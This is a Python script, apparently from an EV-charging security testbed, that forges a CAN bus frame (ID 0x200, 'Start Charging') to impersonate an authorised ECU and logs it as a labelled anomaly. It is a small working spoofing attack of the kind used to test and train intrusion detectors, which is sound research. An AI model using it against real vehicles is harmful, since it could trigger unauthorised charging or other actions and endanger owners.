"""
CAN Bus ID Spoofing Attacker

Bu script, yetkili bir ECU'dan geliyormuş gibi
CAN Bus üzerine sahte (spoofed) mesaj gönderir.

SWOT Referansı:
- Weakness: CAN Bus üzerinde kimlik doğrulama yok
- Threat: Fiziksel erişim (OBD-II, servis portu)
"""

import time
import can
from can_bus_factory import get_can_bus
from event_logger import log_event

SPOOFED_ID = 0x200        # Yetkili şarj başlatma ID'si
SPOOFED_COMMAND = [0x01] # Start Charging

def main():
    bus = get_can_bus()

    print("[ATTACKER] CAN ID Spoofing attack started")
    print(f"[ATTACKER] Spoofing CAN ID {hex(SPOOFED_ID)}")

    msg = can.Message(
        arbitration_id=SPOOFED_ID,
        data=SPOOFED_COMMAND,
        is_extended_id=False
    )

    bus.send(msg)
    log_event(
    layer="CAN",
    source="ATTACKER",
    event_type="START_CHARGE",
    can_id=SPOOFED_ID,
    data="01",
    label="anomaly"
    )


    print("[ATTACKER] 🚨 Spoofed message sent!")
    print(f"[ATTACKER] ID={hex(SPOOFED_ID)} DATA={SPOOFED_COMMAND}")

    time.sleep(1)

if __name__ == "__main__":
    main()
